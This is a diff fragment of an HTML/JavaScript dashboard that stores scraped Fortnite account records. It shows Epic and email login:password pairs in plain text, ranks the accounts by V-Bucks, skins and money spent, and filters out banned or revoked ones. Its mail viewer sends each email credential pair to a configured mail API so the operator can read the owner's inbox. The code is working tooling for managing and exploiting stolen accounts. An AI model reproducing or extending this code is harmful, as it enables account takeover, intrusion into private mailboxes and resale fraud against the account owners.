+                                skin_count: parseInt(acc.fortnite_skin_count) || 0,
+                                email_error: false,
+                                is_revoked: false,
+                                is_banned: false
+                            });
+                        });
+                    } catch (e) {}
+                }, 20, "Deep Scrape");
+
+                auditData = results;
+                saveAndRender();
+                status.innerText = "Scrape Done";
+            } catch (err) {
+                status.innerText = "Error";
+            }
+        }
+
+        function render() {
+            const container = document.getElementById('mainContainer');
+            const term = document.getElementById('search').value.toLowerCase();
+            const sort = document.getElementById('sortOption').value;
+            const errorOnly = document.getElementById('mailErrorOnly').checked;
+            const workingOnly = document.getElementById('noMailError').checked;
+            const revokedOnly = document.getElementById('revokedOnly').checked;
+            const bannedOnly = document.getElementById('bannedOnly').checked;
+
+            let filtered = auditData.filter(x => {
+                const matchesSearch = `${x.fortnite_username} ${x.user_email} ${x.email_login}`.toLowerCase().includes(term);
+                let matchesError = errorOnly ? x.email_error === true : true;
+                let matchesRevoked = revokedOnly ? x.is_revoked === true : true;
+                let matchesBanned = bannedOnly ? x.is_banned === true : true;
+                let matchesWorking = workingOnly ? (x.email_error === false && x.is_revoked === false && x.is_banned === false) : true;
+                return matchesSearch && matchesError && matchesRevoked && matchesBanned && matchesWorking;
+            });
+
+            filtered.sort((a, b) => {
+                if (sort === "admin") return b.is_admin - a.is_admin;
+                if (sort === "spent_high") return b.total_spent_on_site - a.total_spent_on_site;
+                if (sort === "fn_high") return b.fortnite_balance - a.fortnite_balance;
+                if (sort === "skins_high") return b.skin_count - a.skin_count;
+                return 0;
+            });
+
+            document.getElementById('stat-count').innerText = filtered.length;
+            const totalRev = filtered.reduce((acc, curr) => acc + (curr.total_spent_on_site || 0), 0);
+            document.getElementById('stat-rev').innerText = `$${totalRev.toFixed(2)}`;
+
+            container.innerHTML = filtered.map(item => `
+                <div class="account-panel" style="${(item.is_revoked || item.is_banned) ? 'border: 2px solid #000; background: #fffde7;' : ''}">
+                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                        <h2 style="margin:0;">${item.fortnite_username}</h2>
+                        <div>
+                            ${item.is_banned ? '<span class="badge badge-banned">🚫 BANNED</span>' : ''}
+                            ${item.is_revoked ? '<span class="badge badge-revoked">⚠️ REVOKED</span>' : ''}
+                            ${item.is_admin ? '<span class="badge badge-admin">Admin</span>' : ''}
+                            ${item.email_error ? '<span class="badge badge-mail-error">Mail Error</span>' : ''}
+                        </div>
+                    </div>
+                    <div class="data-grid">
+                        <div class="data-group">
+                            <h4>User</h4>
+                            <div class="row"><span>Email:</span><span class="val">${item.user_email}</span></div>
+                            <div class="row"><span>Spent:</span><span class="val">$${item.total_spent_on_site.toFixed(2)}</span></div>
+                        </div>
+                        <div class="data-group">
+                            <h4>Stats</h4>
+                            <div class="row"><span>Skins:</span><span class="val">${item.skin_count}</span></div>
+                            <div class="row"><span>V-Bucks:</span><span class="val">${item.fortnite_balance}</span></div>
+                        </div>
+                    </div>
+                    <div class="data-group" style="border-top:1px solid var(--border); padding-top:10px;">
+                        <div class="row"><span>Epic:</span><span class="val">${item.epic_login}:${item.epic_password}</span></div>
+                        <div class="row"><span>Mail:</span><span class="val">${item.email_login}:<input type="text" class="pw-input" value="${item.email_password}" readonly></span></div>
+                    </div>
+                    <button class="mail-toggle-btn" onclick="toggleMailBox('${item.item_id}', '${item.email_login}', '${item.email_password}')">📩 View Mails</button>
+                    <div id="mail-zone-${item.item_id}" class="mail-container"><div id="list-${item.item_id}"></div></div>
+                </div>`).join('');
+        }
+
+        async function toggleMailBox(id, email, pass) {
+            const zone = document.getElementById(`mail-zone-${id}`);
+            const list = document.getElementById(`list-${id}`);
+            if (zone.style.display === 'block') { zone.style.display = 'none'; return; }
+            zone.style.display = 'block';
+            list.innerHTML = "Fetching...";
+            try {
+                const r = await fetch(`${CONFIG.MAIL_API}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}`);
+                const d = await r.json();
+                list.innerHTML = (d.emails || []).map(m => `
+                    <div style="border-bottom:1px solid #eee; padding:5px 0; color: #000;">
+                        <b>${m.subject}</b>
+                        <button class="btn" style="padding:2px 5px; font-size:0.7rem;" onclick="this.nextElementSibling.style.display='block'">View</button>
+                        <iframe sandbox srcdoc="${(m.html || m.text).replace(/"/g, '&quot;')}" style="display:none; width:100%; height:250px;"></iframe>
+                    </div>`).join('') || "Empty.";
+            } catch (e) { list.innerHTML = "Error."; }
+        }
+
+        async function fetchNewToken() {
+            const r = await fetch(CONFIG.AUTH_URL, {
+                method: 'POST',
+                headers: { 'apikey': CONFIG.API_KEY, 'authorization': `Bearer ${CONFIG.API_KEY}`, 'content-type': 'application/json' },
+                body: JSON.stringify({ email: CONFIG.USER, password: CONFIG.PASS })
+            });
+            const d = await r.json();
+            return d.access_token;
+        }
+
+        function updateTheme() {
+            const root = document.documentElement;
+            const accent = document.getElementById('accentPicker').value;
+            const bg = document.getElementById('bgPicker').value;
+            root.style.setProperty('--accent', accent);
+            root.style.setProperty('--bg', bg);
+            const rgb = parseInt(bg.substring(1).padEnd(6, '0'), 16);
+            const luma = 0.2126 * ((rgb >> 16) & 0xff) + 0.7152 * ((rgb >> 8) & 0xff) + 0.0722 * (rgb & 0xff);
+            root.style.setProperty('--card-bg', luma < 128 ? 'rgba(30,30,30,0.9)' : 'rgba(255,255,255,0.95)');
+            root.style.setProperty('--border', luma < 128 ? '#444' : '#dee2e6');
+        }
+
+        function applyPreset(name) {
+            const acc = document.getElementById('accentPicker');
+            const bg = document.getElementById('bgPicker');
+            if (name === 'ocean') { acc.value = "#007bff"; bg.value = "#f0f2f5"; }
+            if (name === 'midnight') { acc.value = "#e94560"; bg.value = "#1a1a2e"; }
+            if (name === 'sunset') { acc.value = "#ff4e50"; bg.value = "#fff5f5"; }
+            if (name === 'matrix') { acc.value = "#00ff41"; bg.value = "#000000"; }
+            updateTheme();
+        }
+
+        function saveAndRender() {
+            localStorage.setItem('audit_v12_storage', JSON.stringify(auditData));
+            render();
+        }
+
+        function clearData() {
+            if (confirm("Reset?")) { auditData = []; saveAndRender(); }
+        }
+
+        function exportJSON() {
+            const blob = new Blob([JSON.stringify(auditData, null, 2)], { type: 'application/json' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `audit_v12.7.json`;
+            a.click();
+        }
+
+        function importJSON(e) {
+            const reader = new FileReader();
+            reader.onload = (ev) => { auditData = JSON.parse(ev.target.result); saveAndRender(); };
+            reader.readAsText(e.target.files[0]);
+        }
+
+        particlesJS('particles-js', {
+            "particles": {
+                "number": { "value": 80 },
+                "color": { "value": "#888" },
+                "opacity": { "value": 0.2 },
+                "size": { "value": 3 },
+                "line_linked": { "enable": true, "opacity": 0.1 },
+                "move": { "enable": true, "speed": 1.5 }
+            }
+        });
+
+        window.onload = () => { applyPreset('ocean'); render(); };
+    </script>
+</body>
+</html>
